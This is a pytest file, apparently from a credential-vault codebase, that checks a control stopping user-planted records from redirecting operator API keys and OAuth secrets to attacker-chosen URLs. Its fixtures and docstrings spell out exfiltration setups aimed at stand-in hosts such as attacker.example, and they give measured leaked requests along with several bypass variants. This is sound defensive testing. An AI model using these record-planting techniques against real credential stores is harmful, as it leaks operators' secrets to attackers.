"""A vault record may only steer a request it also authenticates (E10-02 slice B).

``get_native_credential_value`` re-runs its record-selection loop on every call
and answers with the first matching record that holds any requested field name.
Destination lookups (a base URL, a host fragment, an OAuth token endpoint) and
secret lookups are separate calls, so without a join they resolve to DIFFERENT
records: one record supplies the address, another supplies the credential that
rides to it. Both are reachable over REST by any authenticated caller, since
``POST /credentials`` takes arbitrary provider/metadata/secret_fields and
``include_system=True`` lets a user's lookup see the deployment-wide row.

The control is a provenance join: a destination is served only from the FIRST
record holding any anchor field, and only when that record holds EVERY anchor
field any other visible record holds. These tests pin both halves, the one
deliberate exemption, and the register that decides which fields are
destinations at all.

``secret_fields`` is entirely caller-chosen, so naming an anchor is not the same
as owning one. Completeness is what makes that survivable: a record that names
every anchor to satisfy the join also wins those secret lookups, so it can only
send its own junk to its own address. ``test_a_planted_record_that_holds_every_
anchor_serves_its_own_secret`` pins exactly that, and it is also the honest
statement of what this control does NOT do.
"""

from __future__ import annotations

import ast
import pathlib

import pytest
from cryptography.fernet import Fernet

import nymeria.tools  # noqa: F401  (imports every module that registers a spec)
from nymeria.core.accounts import AccountsRepo
from nymeria.core.credential_vault import CredentialVaultRepo
from nymeria.tools.credential_registry import (
    DESTINATION_PRIMARY_FIELDS,
    credential_anchor_fields,
    destination_fields_for,
    get_provider_spec,
    iter_provider_specs,
)

TOOLS_PACKAGE = pathlib.Path(__file__).resolve().parents[1] / "nymeria" / "tools"


@pytest.fixture
def vault_setup(tmp_path, monkeypatch):
    """Isolated vault + settings sandbox, mirroring the auth-cache tests."""
    monkeypatch.setenv("NYMERIA_SECRETS_KEY", Fernet.generate_key().decode())

    from nymeria.config import settings as settings_module

    settings_module.get_settings.cache_clear()
    monkeypatch.setenv("NYMERIA_DATA_DIR", str(tmp_path))
    monkeypatch.setenv("DATABASE_BACKEND", "sqlite")

    db_path = tmp_path / "accounts.db"
    accounts = AccountsRepo(db_path)
    accounts.create_user("alice", "alice@example.com", "Alice")

    from nymeria.core import credential_vault as vault_module

    monkeypatch.setattr(vault_module, "_repo_instance", None, raising=False)
    repo = CredentialVaultRepo(db_path)
    monkeypatch.setattr(vault_module, "get_credential_vault_repo", lambda db_path=None: repo)

    yield repo

    settings_module.get_settings.cache_clear()


def _mint(repo, *, name, provider, secret_fields, owner_type="user", user_id="alice"):
    return repo.create_credential(
        owner_type=owner_type,
        owner_user_id=user_id if owner_type == "user" else None,
        name=name,
        provider=provider,
        kind="api_key",
        account_label=name,
        metadata={},
        scopes=[],
        allowed_targets=["native_tool:*"],
        secret_fields=secret_fields,
        created_by_user_id=user_id,
    )


def _lookup(provider, field_names, tool_name="grafana_query", aliases=()):
    from nymeria.tools.native_credentials import get_native_credential_value

    return get_native_credential_value(
        provider=provider,
        provider_aliases=aliases,
        field_names=field_names,
        tool_name=tool_name,
        config={"configurable": {"user_id": "alice"}},
    )


def _value(provider, field_names, tool_name="grafana_query"):
    resolved = _lookup(provider, field_names, tool_name)
    assert resolved is not None, f"{provider} {field_names} resolved to nothing"
    return resolved.value


def _assert_refused(provider, field_names, tool_name="grafana_query", aliases=()):
    """The lookup must REFUSE, not merely return nothing.

    The difference matters more than it looks. A silent ``None`` lands in each
    call site's ``... or _settings_value(...) or VENDOR_DEFAULT`` chain, so the
    request goes to the vendor's public API carrying the operator's credential
    rather than not going at all.
    """
    from nymeria.tools.native_credentials import CredentialDestinationRefused

    with pytest.raises(CredentialDestinationRefused):
        _lookup(provider, field_names, tool_name, aliases)


# --- the join itself -------------------------------------------------------


def test_a_record_holding_only_a_base_url_cannot_steer_another_records_key(vault_setup):
    """The attack, end to end.

    The operator's deployment-wide Grafana key lives in a system record. A
    caller adds their own record naming only a base URL. Resolved independently,
    the address comes from the caller's row and the key from the operator's, so
    the operator's Grafana key is delivered to an address the caller chose.
    """
    repo = vault_setup
    _mint(
        repo,
        name="operator grafana",
        provider="grafana",
        secret_fields={"api_key": "OPERATOR-GRAFANA-KEY"},
        owner_type="system",
    )
    _mint(
        repo,
        name="planted",
        provider="grafana",
        secret_fields={"base_url": "https://attacker.example"},
    )

    assert _value("grafana", ("api_key", "token", "value")) == "OPERATOR-GRAFANA-KEY", (
        "the key lookup must still succeed, or this proves nothing about the destination"
    )
    _assert_refused("grafana", ("base_url", "baseUrl", "url", "api_url", "apiUrl"))


def test_one_record_carrying_both_is_served_normally(vault_setup):
    """The ordinary saved shape keeps working, which is the whole point."""
    repo = vault_setup
    _mint(
        repo,
        name="my grafana",
        provider="grafana",
        secret_fields={"api_key": "MY-KEY", "base_url": "https://grafana.internal"},
    )

    assert _value("grafana", ("base_url", "url")) == "https://grafana.internal"
    assert _value("grafana", ("api_key", "token", "value")) == "MY-KEY"


def test_a_joined_record_wins_over_a_higher_ranked_destination_only_record(vault_setup):
    """Refusing one record must not abort the search.

    A user-owned record outranks a system one, so a destination-only user record
    is reached first. It holds no anchor at all, so it is not the first
    anchor-holder and the search has to continue rather than return None, or
    adding a stray record would break a working integration.
    """
    repo = vault_setup
    _mint(
        repo,
        name="destination only",
        provider="grafana",
        secret_fields={"base_url": "https://attacker.example"},
    )
    _mint(
        repo,
        name="operator grafana",
        provider="grafana",
        secret_fields={"api_key": "OPERATOR-KEY", "base_url": "https://grafana.internal"},
        owner_type="system",
    )

    assert _value("grafana", ("base_url", "url")) == "https://grafana.internal"


def test_the_public_half_of_a_keyed_pair_does_not_anchor_a_destination(vault_setup):
    """`client_id` is not a destination, and still proves nothing.

    Reddit's token endpoint receives `client_id` AND the operator's
    `client_secret`, so a record that carries only the public half must not be
    trusted with the address that pair is sent to.
    """
    repo = vault_setup
    _mint(
        repo,
        name="planted reddit",
        provider="reddit",
        secret_fields={"token_url": "https://attacker.example/token", "client_id": "public-id"},
    )

    _assert_refused("reddit", ("token_url", "tokenUrl"), "reddit_search")


def test_a_secret_lookup_is_never_gated(vault_setup):
    """Only destination lookups join. Gating a secret lookup would be circular."""
    repo = vault_setup
    _mint(repo, name="key only", provider="grafana", secret_fields={"api_key": "K"})

    assert _value("grafana", ("api_key", "token", "value")) == "K"


# --- completeness: naming ONE anchor is not enough -------------------------


def test_a_second_independent_secret_group_cannot_anchor_a_destination(vault_setup):
    """Contentful declares two independent tokens, and that used to be a bypass.

    A record naming only `preview_token` proved possession under a rule that
    accepted any single anchor, so it could steer the request that the
    operator's `delivery_token` authenticated. 36 of 187 providers have this
    multi-secret shape.
    """
    repo = vault_setup
    _mint(
        repo,
        name="operator contentful",
        provider="contentful",
        secret_fields={"delivery_token": "OPERATOR-DELIVERY-TOKEN"},
        owner_type="system",
    )
    _mint(
        repo,
        name="planted",
        provider="contentful",
        secret_fields={"base_url": "https://attacker.example", "preview_token": "junk"},
    )

    assert _value("contentful", ("delivery_token", "token")) == "OPERATOR-DELIVERY-TOKEN"
    _assert_refused("contentful", ("base_url", "url"))


def test_an_oauth_refresh_token_cannot_anchor_the_token_endpoint(vault_setup):
    """Same shape on the OAuth path, where the stakes are the operator's secret.

    Reddit's token exchange POSTs `Basic base64(client_id:client_secret)` to
    whatever `token_url` resolves to. A planted record naming a junk
    `refresh_token` is a real anchor field, so only completeness refuses it.
    """
    repo = vault_setup
    _mint(
        repo,
        name="operator reddit",
        provider="reddit",
        secret_fields={"client_id": "OP-ID", "client_secret": "OP-SECRET"},
        owner_type="system",
    )
    _mint(
        repo,
        name="planted",
        provider="reddit",
        secret_fields={"token_url": "https://attacker.example/token", "refresh_token": "junk"},
    )

    _assert_refused("reddit", ("token_url", "tokenUrl"), "reddit_search")
    assert _value("reddit", ("client_secret", "clientSecret"), "reddit_search") == "OP-SECRET"


def test_an_alias_that_is_not_really_a_secret_cannot_anchor_alone(vault_setup):
    """Shopify's `api_key` group aliases `username`, so `username` reads as an anchor.

    The register classifies whole groups, and a group's aliases are not always
    the same kind of thing as its primary. Completeness is what keeps that
    imprecision from being a bypass: the operator's record holds `access_token`,
    which the planted record does not.
    """
    repo = vault_setup
    _mint(
        repo,
        name="operator shopify",
        provider="shopify",
        secret_fields={"access_token": "OP-SHOPIFY-TOKEN"},
        owner_type="system",
    )
    _mint(
        repo,
        name="planted",
        provider="shopify",
        secret_fields={"base_url": "https://attacker.example/admin", "username": "junk"},
    )

    _assert_refused("shopify", ("base_url", "url", "admin_url"), "shopify_list_products")
    assert (
        _value("shopify", ("access_token", "accessToken", "token", "value"), "shopify_list_products")
        == "OP-SHOPIFY-TOKEN"
    )


def test_a_planted_record_that_holds_every_anchor_serves_its_own_secret(vault_setup):
    """The honest limit of this control, pinned so it cannot regress silently.

    `secret_fields` is caller-chosen, so a record CAN satisfy the join by simply
    naming every anchor field with junk values. It then wins the destination, but
    it also outranks the operator's record on every one of those secret lookups,
    so what rides to the attacker's address is the attacker's own junk. That is
    the property the join buys, and it is only true while "holds an anchor" is
    judged by VALUE: see the empty-anchor test below, which is the version of
    this that was NOT harmless.
    """
    repo = vault_setup
    _mint(
        repo,
        name="operator grafana",
        provider="grafana",
        secret_fields={"api_key": "OPERATOR-GRAFANA-KEY"},
        owner_type="system",
    )
    _mint(
        repo,
        name="planted",
        provider="grafana",
        secret_fields={"base_url": "https://attacker.example", "api_key": "junk"},
    )

    assert _value("grafana", ("base_url", "url")) == "https://attacker.example"
    assert _value("grafana", ("api_key", "token", "value")) == "junk", (
        "the planted record steered the request but did not supply the key that rode to it"
    )


def test_an_empty_anchor_field_is_not_possession(vault_setup):
    """Naming an anchor is not holding one, and the difference was a live bypass.

    Two readings of the same record disagreed. The completeness rule read
    ``record.secret_fields``, a list of NAMES, so an anchor spelled with an empty
    value counted as held. The lookup loop that consumes its answer takes the
    first TRUTHY value, so the same empty field was skipped and the NEXT record
    answered. `POST /credentials` takes a bare ``dict[str, str]`` and any
    authenticated user can reach it, so the planted record below cost nothing to
    create.

    Measured before the fix, on ``_elasticsearch_config``: base URL
    ``https://attacker.invalid`` with ``Authorization: ApiKey
    OPERATOR-ELASTIC-KEY``. The guard at the request site could not catch it
    either, because the operator's key really did come from the vault, so its
    provenance bit was true. Judging possession by value is what makes that bit
    mean what its name says.
    """
    repo = vault_setup
    _mint(
        repo,
        name="operator grafana",
        provider="grafana",
        secret_fields={"api_key": "OPERATOR-GRAFANA-KEY"},
        owner_type="system",
    )
    _mint(
        repo,
        name="planted",
        provider="grafana",
        secret_fields={"base_url": "https://attacker.example", "api_key": ""},
    )

    _assert_refused("grafana", ("base_url", "url"))
    assert _value("grafana", ("api_key", "token", "value")) == "OPERATOR-GRAFANA-KEY", (
        "the operator's key must still resolve; only the planted ADDRESS is refused"
    )

    # And the same records under the OLD reading, so this test carries its own
    # counterfactual instead of asserting the fix into existence. Reverting the
    # rule means passing a name-based `holds`, which is exactly this lambda.
    from nymeria.tools.native_credentials import _destination_record_id

    records = [
        record
        for record in repo.list_credentials(owner_user_id="alice", include_system=True)
        if record.provider == "grafana"
    ]
    records.sort(key=lambda record: (0 if record.owner_type == "user" else 1,))
    anchors = credential_anchor_fields(get_provider_spec("grafana"))
    by_name, _ = _destination_record_id(
        records, anchors, lambda record: anchors & set(record.secret_fields or ())
    )
    by_value, _ = _destination_record_id(
        records,
        anchors,
        lambda record: frozenset(
            name
            for name in anchors & set(record.secret_fields or ())
            if repo.get_secret_field(
                record.id,
                name,
                actor="alice",
                target_type="native_tool",
                target_id="grafana_query",
            )
        ),
    )
    planted = next(record.id for record in records if record.name == "planted")
    operator = next(record.id for record in records if record.name == "operator grafana")
    assert by_name == planted, (
        "the name-based reading is what let the planted record serve the address; "
        "if this stops being true the counterfactual has rotted and the test above "
        "may be passing for a different reason"
    )
    assert by_value == operator, (
        "under the value reading the right to serve the address moves to the record "
        "that actually holds the key, which holds no base_url, so the lookup finds "
        "nothing and raises rather than resolving the planted one"
    )


def test_a_bound_system_record_is_not_steered_by_a_later_user_record(vault_setup):
    """Ordering, not just set membership, decides who may serve a destination.

    A binding scores a system credential above an unbound user record, inverting
    the usual user-first order. The planted record holds the whole anchor union,
    so completeness alone is satisfied and it would serve the address, while the
    bound record still answers the `delivery_token` lookup ahead of it. Only "the
    FIRST anchor-holder serves, or nobody does" closes that.
    """
    repo = vault_setup
    system_record = _mint(
        repo,
        name="operator contentful",
        provider="contentful",
        secret_fields={"delivery_token": "OPERATOR-DELIVERY-TOKEN"},
        owner_type="system",
    )
    repo.bind_credential(
        system_record.id,
        target_type="native_tool",
        target_id="contentful_query",
        actor_user_id="alice",
    )
    _mint(
        repo,
        name="planted",
        provider="contentful",
        secret_fields={
            "base_url": "https://attacker.example",
            "delivery_token": "junk",
            "preview_token": "junk",
        },
    )

    assert (
        _value("contentful", ("delivery_token", "token"), "contentful_query")
        == "OPERATOR-DELIVERY-TOKEN"
    )
    _assert_refused("contentful", ("base_url", "url"), "contentful_query")


def test_the_public_half_of_a_pair_does_not_anchor_when_it_is_the_only_record(vault_setup):
    """Completeness is vacuous with one record, so the non-proof list carries it.

    AWS spells its public half `access_key_id`, under `role="access_key"` (which
    is MessageBird's ACTUAL secret, so only the primary name catches this one).
    The matching `secret_access_key` usually comes from the environment rather
    than the vault, so there is no second record for completeness to compare
    against and nothing but the classification stands between a planted
    `endpoint_url` and the operator's env-configured AWS key.
    """
    repo = vault_setup
    _mint(
        repo,
        name="planted aws",
        provider="aws",
        secret_fields={"endpoint_url": "https://attacker.example", "access_key_id": "junk"},
    )

    _assert_refused("aws", ("endpoint_url", "endpointUrl", "endpoint"), "s3_list_objects")


# --- which lookups are destination lookups ---------------------------------


def test_a_destination_name_anywhere_in_the_tuple_arms_the_gate(vault_setup):
    """Classification is per-spec membership, not the requested primary.

    Keying on `field_names[0]` left the gate disarmed for a tuple spelled the
    other way round. No shipped call site orders one like this, which is exactly
    why it needed a test rather than a comment. The operator's record spells its
    key `api_key` and the tuple asks for `apiKey`, so the only field either
    record can answer with is the planted address.
    """
    repo = vault_setup
    _mint(
        repo,
        name="operator grafana",
        provider="grafana",
        secret_fields={"api_key": "OPERATOR-GRAFANA-KEY"},
        owner_type="system",
    )
    _mint(
        repo,
        name="planted",
        provider="grafana",
        secret_fields={"base_url": "https://attacker.example"},
    )

    _assert_refused("grafana", ("apiKey", "base_url"))


def test_no_spec_shares_a_name_between_a_destination_group_and_any_other():
    """What makes per-spec classification exact rather than merely better.

    Ambiguous names are real (`value` is a base-URL alias for searxng and a
    secret alias for 27 roles elsewhere), but no single provider spells both
    with the same name. If one ever did, a secret lookup would arm the gate and
    get itself pinned to one record.
    """
    overlaps = {}
    for spec in iter_provider_specs():
        destinations = destination_fields_for(spec)
        for group in spec.groups:
            if group.names[0] in DESTINATION_PRIMARY_FIELDS:
                continue
            shared = destinations & set(group.names)
            if shared:
                overlaps[f"{spec.provider}.{group.role}"] = sorted(shared)
    assert not overlaps, overlaps


# --- the one deliberate exemption ------------------------------------------


def test_a_provider_with_nothing_to_protect_still_serves_its_base_url(vault_setup):
    """SearXNG is a bare instance URL with no credential anywhere.

    Gating it would delete a working feature to protect a secret that does not
    exist, which is the trade the operator's standing rule forbids.
    """
    repo = vault_setup
    _mint(
        repo,
        name="my searx",
        provider="searxng",
        secret_fields={"base_url": "https://searx.internal"},
    )

    assert (
        _value("searxng", ("base_url", "url", "value"), "web_search_searxng")
        == "https://searx.internal"
    )


def test_only_searxng_is_exempt_and_that_is_deliberate():
    """Pins the exemption list so a new one cannot appear unnoticed.

    A provider is exempt when every field it declares is either a destination or
    on a non-proof list, meaning there is no credential for a destination to
    steer. SearXNG is a bare instance URL and nothing else. Any second exemption
    needs the same explicit argument, because an exempt provider is an ungated
    one.
    """
    exempt = sorted(
        spec.provider
        for spec in iter_provider_specs()
        if any(group.names[0] in DESTINATION_PRIMARY_FIELDS for group in spec.groups)
        and not credential_anchor_fields(spec)
    )
    assert exempt == ["searxng"]


def test_every_other_provider_with_a_destination_keeps_a_real_anchor():
    """Excluding the public halves must not silently disarm the gate."""
    gated = [
        spec
        for spec in iter_provider_specs()
        if any(group.names[0] in DESTINATION_PRIMARY_FIELDS for group in spec.groups)
        and credential_anchor_fields(spec)
    ]
    assert len(gated) == 170, f"coverage moved: {len(gated)} providers gated"
    for spec in gated:
        anchors = credential_anchor_fields(spec)
        assert anchors, spec.provider
        assert not (anchors & DESTINATION_PRIMARY_FIELDS), (
            f"{spec.provider} anchors on a destination field, which is circular"
        )


def test_a_group_aliasing_a_destination_name_cannot_anchor():
    """A name that is a destination somewhere is never proof of possession.

    Checked against a synthetic spec because no shipped provider currently trips
    it: salesmate did, with a required ``link_name`` group aliasing ``url`` and
    ``domain``, until ``link_name`` was classified non-proof for its own reasons.
    The invariant outlives that coincidence. Without it, a provider could declare
    an anchor group whose alias is an address, and a record holding only that
    address would prove possession of itself.
    """
    from nymeria.tools.credential_registry import CredentialFieldGroup, ProviderCredentialSpec

    spec = ProviderCredentialSpec(
        provider="synthetic_alias_collision",
        groups=(
            CredentialFieldGroup(role="base_url", names=("base_url", "url"), required=False),
            # Reads as a credential, but one of its spellings is an address.
            CredentialFieldGroup(role="account_ref", names=("account_ref", "domain")),
            CredentialFieldGroup(role="api_key", names=("api_key",)),
        ),
    )

    anchors = credential_anchor_fields(spec)
    assert anchors == {"api_key"}
    assert "domain" not in anchors and "account_ref" not in anchors


def test_a_public_half_spelled_as_a_secret_cannot_anchor():
    """Mailjet's public key is `role="email_api_key"` with primary `api_key`.

    Its primary is a genuine secret name almost everywhere else, so only the
    role names this group correctly. The two keys are checked together because
    neither covers the register alone: the role `access_key` is AWS's public
    half and MessageBird's actual secret, and AWS is caught by its primary.
    """
    spec = get_provider_spec("mailjet")
    assert spec is not None
    anchors = credential_anchor_fields(spec)
    assert not (anchors & {"public_key", "publicKey", "username"}), sorted(anchors)
    assert {"secret_key", "sms_token"} <= anchors, "mailjet lost its real anchors"


# --- the discovery gate ----------------------------------------------------

# Registry primaries that are NOT destinations, declared rather than derived as
# "everything the register omits". Deriving it made the gate below assert only
# that a name is declared SOMEWHERE, which every registry primary satisfies by
# construction, so a new destination primary would have passed unnoticed. Same
# shape and same reason as `_NON_STORE_DATA_DIR_CHILDREN` in
# `tests/test_resource_layout.py`: the second set has to be written down for the
# partition to mean anything.
_NON_DESTINATION_PRIMARY_FIELDS = {
    "access_key", "access_key_id", "access_token", "account_id",
    "account_key", "account_sid", "admin_api_key", "algorithm",
    "allow_unauthorized_certs", "api_id", "api_key", "api_key_header",
    "api_key_sid", "api_secret", "api_token", "api_username", "app_api_key",
    "app_id", "app_secret", "app_token", "auth_header", "auth_id",
    "auth_key", "auth_token", "authorization", "bearer_token", "bot_token",
    "broadcaster_refresh_token", "broadcaster_token",
    "business_account_id", "client_id", "client_secret", "client_token",
    "consumer_key", "consumer_secret", "content_api_key", "content_token",
    "database", "delivery_token", "email", "force_path_style", "from_email",
    "headers_json", "hmac_secret", "hostname", "ignore_ssl_issues",
    "intercom_version", "link_name", "management_token", "notion_version",
    "organizer_key", "page_access_token", "passphrase", "password",
    "phone_number_id", "preview_token", "private_app_token", "private_key",
    "public_key", "realm_id", "refresh_token", "secret",
    "secret_access_key", "secret_key", "service_role", "session_token",
    "sign_private_key", "signature", "sms_token", "space_id", "team_secret",
    "tenant_id", "token", "tracking_api_key", "tracking_site_id",
    "user_key", "user_token", "username", "vendor_auth_code", "vendor_id",
    "write_key",
}


def _literal_lookups() -> list[tuple[ast.expr | None, tuple[str, ...], str]]:
    """Every (provider node, field_names, site) the tools package spells literally.

    Flow-insensitive on purpose: literal tuples are collected wherever they
    appear, including where they are passed into a wrapper that forwards its own
    ``field_names`` parameter. Names bound through a variable are resolved by the
    registry sweep in the callers instead. The provider is returned as its AST
    node rather than a string because almost every site sources it from a spec
    object, which is itself the property worth asserting.
    """
    found: list[tuple[ast.expr | None, tuple[str, ...], str]] = []
    for path in sorted(TOOLS_PACKAGE.glob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for scope in ast.walk(tree):
            if not isinstance(scope, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            params = {
                arg.arg
                for arg in (*scope.args.posonlyargs, *scope.args.args, *scope.args.kwonlyargs)
            }
            for node in ast.walk(scope):
                if not isinstance(node, ast.Call):
                    continue
                keywords = {kw.arg: kw.value for kw in node.keywords if kw.arg}
                names = keywords.get("field_names")
                if names is None:
                    continue
                literal: tuple[str, ...] = ()
                if (
                    isinstance(names, (ast.Tuple, ast.List))
                    and names.elts
                    and all(
                        isinstance(elt, ast.Constant) and isinstance(elt.value, str)
                        for elt in names.elts
                    )
                ):
                    literal = tuple(elt.value for elt in names.elts)  # type: ignore[attr-defined]
                provider = keywords.get("provider")
                # A bare name that is one of this function's own parameters is a
                # passthrough wrapper; its callers are swept on their own.
                if isinstance(provider, ast.Name) and provider.id in params:
                    provider = None
                found.append((provider, literal, f"{path.name}:{names.lineno}"))
    return found


def test_no_requested_field_name_escapes_classification():
    """A new destination field must not be able to default into the inert half.

    The register is explicit rather than derived, following
    `core/resource_map.py::_STORE_ROWS`, so this walks the tools package and the
    live registry and fails when a name is in neither half. Silence here is the
    failure mode worth guarding: an unclassified destination is a hole that looks
    exactly like a field nobody thought about.
    """
    assert TOOLS_PACKAGE.is_dir(), TOOLS_PACKAGE
    lookups = _literal_lookups()
    assert lookups, "the AST sweep found no literal lookups, so it is asserting nothing"

    registry_primaries = {
        group.names[0] for spec in iter_provider_specs() for group in spec.groups
    }
    classified = DESTINATION_PRIMARY_FIELDS | _NON_DESTINATION_PRIMARY_FIELDS

    unclassified = {
        names[0]: site
        for _, names, site in lookups
        if names and names[0] not in classified
    }
    assert not unclassified, (
        f"field names requested by the tools package that no half classifies: {unclassified}"
    )

    assert registry_primaries <= classified, (
        "registry primaries neither half classifies: "
        f"{sorted(registry_primaries - classified)}"
    )
    assert not (DESTINATION_PRIMARY_FIELDS & _NON_DESTINATION_PRIMARY_FIELDS), (
        "the two halves overlap, so a name is both a destination and inert: "
        f"{sorted(DESTINATION_PRIMARY_FIELDS & _NON_DESTINATION_PRIMARY_FIELDS)}"
    )
    assert DESTINATION_PRIMARY_FIELDS <= registry_primaries, (
        "the register lists a primary no provider declares: "
        f"{sorted(DESTINATION_PRIMARY_FIELDS - registry_primaries)}"
    )


def test_no_lookup_names_a_provider_the_registry_does_not_know():
    """Pins the fail-open arm shut.

    `_destination_anchor_fields` gates nothing when it cannot resolve a spec,
    because without one there is no way to know what possession looks like. That
    is only acceptable while it stays unreachable, so this reads the actual
    `provider=` argument at every literal lookup site rather than asking the
    registry about itself, which it always answers yes to.

    Today every site spells it `_SOME_SPEC.provider`, which is unreachable by
    construction. A hand-written string is not wrong, but it is the one shape
    that can name a provider nobody registered, so it has to resolve.
    """
    lookups = _literal_lookups()
    assert len(lookups) > 500, (
        f"the AST sweep found only {len(lookups)} lookup sites; it used to require a "
        "literal field_names tuple, which reduced it to 19 and made both assertions "
        "below pass on empty dicts"
    )

    unsourced: dict[str, str] = {}
    literals: dict[str, str] = {}
    for provider, _, site in lookups:
        if isinstance(provider, ast.Attribute) and provider.attr == "provider":
            continue
        if isinstance(provider, ast.Constant) and isinstance(provider.value, str):
            literals[provider.value] = site
        elif provider is not None:
            unsourced[ast.dump(provider)[:80]] = site

    assert not unsourced, (
        f"provider= arguments that come from neither a spec nor a literal: {unsourced}"
    )
    missing = {name: site for name, site in literals.items() if get_provider_spec(name) is None}
    assert not missing, missing


def test_a_refused_address_never_retargets_the_request_at_the_vendor(vault_setup, monkeypatch):
    """The regression this control could easily have caused, driven end to end.

    Baserow is self-hostable and its call site ends
    ``_credential_value(...) or _settings_value(...) or _BASEROW_BASE_URL``. An
    operator keeping the address in the vault and the token in the environment
    has a record the join must refuse, and if that refusal were a silent ``None``
    the chain would fall to ``https://api.baserow.io`` and post their
    self-hosted instance token to Baserow's public API. That is the disclosure
    this control exists to prevent, produced BY the control, so the refusal has
    to stop the call rather than redirect it. 95 chains end in a vendor constant
    like this one.
    """
    from nymeria.tools import data_table_service_integrations as mod
    from nymeria.tools.native_credentials import CredentialDestinationRefused

    repo = vault_setup
    _mint(
        repo,
        name="self-hosted baserow",
        provider="baserow",
        secret_fields={"base_url": "https://baserow.internal"},
    )
    monkeypatch.setattr(mod, "_settings_value", lambda name: None)

    with pytest.raises(CredentialDestinationRefused):
        mod._baserow_config("baserow_rows", {"configurable": {"user_id": "alice"}})


def test_a_provider_with_nothing_saved_still_falls_back_to_its_vendor_default(vault_setup, monkeypatch):
    """Absence must stay absence, or the fix above would break every unsaved tool.

    This is the other half of the same distinction: with no record at all the
    lookup returns None as it always has, and the vendor default is exactly the
    right answer.
    """
    from nymeria.tools import data_table_service_integrations as mod

    monkeypatch.setattr(mod, "_settings_value", lambda name: None)

    base, headers_or_hint = mod._baserow_config(
        "baserow_rows", {"configurable": {"user_id": "alice"}}
    )
    assert base == mod._BASEROW_BASE_URL
    assert isinstance(headers_or_hint, str), "expected the setup hint, not usable headers"
    assert headers_or_hint.startswith("[Error]:")


def test_no_non_proof_entry_is_dead_weight():
    """Every name in the non-proof register must exclude a real group.

    A register whose entries are redundant reads as coverage it does not
    provide, and the redundancy is invisible: an entry only matters if some spec
    declares a group with that role or primary that is not already disqualified
    for aliasing a destination. `link_name` was exactly that and has been
    removed. This fails when the next one appears, whether because a spec
    changed or because a name was added on the assumption it was needed.
    """
    from nymeria.tools.credential_registry import _NON_PROOF_NAMES

    groups = [group for spec in iter_provider_specs() for group in spec.groups]
    dead = sorted(
        name
        for name in _NON_PROOF_NAMES
        if not any(
            (group.role == name or group.names[0] == name)
            and not (set(group.names) & DESTINATION_PRIMARY_FIELDS)
            for group in groups
        )
    )
    assert not dead, f"non-proof entries that exclude no group: {dead}"


def test_a_record_under_a_branch_alias_cannot_steer_the_shared_address(vault_setup):
    """Naming a credential field is not the same as being asked for it.

    PagerDuty resolves its base URL with the spec's FULL alias list but each
    token with one branch alias. A record saved under the other branch is
    therefore visible to the address lookup and invisible to the token lookup, so
    it could satisfy the join by merely naming `api_token` with a junk value, get
    its address served, and never be reached by the lookup that would have handed
    it its own junk back. The operator's record answered that one instead. Ghost
    has the identical shape; both were reproduced against the real vault.
    """
    repo = vault_setup
    _mint(
        repo,
        name="operator pagerduty",
        provider="pagerduty",
        secret_fields={"api_token": "OPERATOR-PAGERDUTY-TOKEN"},
        owner_type="system",
    )
    _mint(
        repo,
        name="planted",
        provider="pagerduty_oauth2_api",
        secret_fields={"base_url": "https://attacker.example", "api_token": "junk"},
    )

    spec = get_provider_spec("pagerduty")
    assert spec is not None
    assert "pagerduty_oauth2_api" in spec.aliases, "the shape this test needs is gone"
    _assert_refused(
        "pagerduty",
        spec.group("base_url"),
        "pagerduty_incidents",
        aliases=spec.aliases,
    )


def test_records_that_agree_on_the_provider_name_are_unaffected(vault_setup):
    """The branch rule must not cost the ordinary multi-record case.

    Two records for the same provider, spelled the same way, still resolve
    exactly as before: the first one serves both its address and its key.
    """
    repo = vault_setup
    _mint(
        repo,
        name="prod grafana",
        provider="grafana",
        secret_fields={"api_key": "PROD-KEY", "base_url": "https://g.prod"},
    )
    _mint(
        repo,
        name="stage grafana",
        provider="grafana",
        secret_fields={"api_key": "STAGE-KEY", "base_url": "https://g.stage"},
        owner_type="system",
    )

    assert _value("grafana", ("base_url", "url")) == "https://g.prod"
    assert _value("grafana", ("api_key", "token", "value")) == "PROD-KEY"


# --- sibling-helper joins: the address and the secret meet in a THIRD function

def _reddit_config(monkeypatch, *, planted: dict, settings_env: dict):
    """Drive the real ``_reddit_config`` with a planted record and env settings."""
    from nymeria.config import settings as settings_module
    from nymeria.tools import community_publishing_service_integrations as mod

    for key, value in settings_env.items():
        monkeypatch.setenv(key, value)
    settings_module.get_settings.cache_clear()
    return mod._reddit_config(
        "reddit_get_subreddit", {"configurable": {"user_id": "alice"}}
    )


def test_reddit_bearer_will_not_ride_to_a_record_chosen_base(vault_setup, monkeypatch):
    """A live leak found by adversarial review, on a provider this pass touched.

    ``_reddit_access_token`` returns the direct token BEFORE reaching either of
    its own guards, and it never sees the base URL that token rides to, because
    ``_reddit_base`` resolves that in a sibling helper. Neither function looked
    shaped alone. Reddit declares three independent anchor groups, so a record
    holding ``base_url`` + ``refresh_token`` clears the completeness rule, misses
    the ``token`` lookup entirely, and the deployment's setting answers it.

    Measured before the fix:
        GET https://attacker.invalid/r/python/about
        Authorization: Bearer OPERATOR-REDDIT-BEARER
    """
    from nymeria.tools.native_credentials import CredentialDestinationRefused

    _mint(
        vault_setup,
        name="planted",
        provider="reddit",
        secret_fields={
            "base_url": "https://attacker.invalid",
            "refresh_token": "junk",
        },
    )
    with pytest.raises(CredentialDestinationRefused):
        _reddit_config(
            monkeypatch,
            planted={},
            settings_env={"REDDIT_ACCESS_TOKEN": "OPERATOR-REDDIT-BEARER"},
        )


def test_reddit_still_works_when_one_record_holds_both(vault_setup, monkeypatch):
    """The control must cost no legitimate capability.

    One record holding the address AND the token it authenticates is the
    ordinary self-hosted shape, and it has to keep working even with a stale
    deployment setting present.
    """
    _mint(
        vault_setup,
        name="mine",
        provider="reddit",
        secret_fields={
            "base_url": "https://reddit.self.hosted",
            "access_token": "MY-OWN-BEARER",
        },
    )
    base, headers, oauth = _reddit_config(
        monkeypatch,
        planted={},
        settings_env={"REDDIT_ACCESS_TOKEN": "OPERATOR-REDDIT-BEARER"},
    )
    assert base.startswith("https://reddit.self.hosted")
    assert headers["Authorization"] == "Bearer MY-OWN-BEARER"
    assert oauth is True


def test_reddit_settings_only_deployment_is_untouched(vault_setup, monkeypatch):
    """No vault record at all: the operator's own configuration must still work."""
    base, headers, oauth = _reddit_config(
        monkeypatch,
        planted={},
        settings_env={"REDDIT_ACCESS_TOKEN": "OPERATOR-REDDIT-BEARER"},
    )
    assert headers["Authorization"] == "Bearer OPERATOR-REDDIT-BEARER"
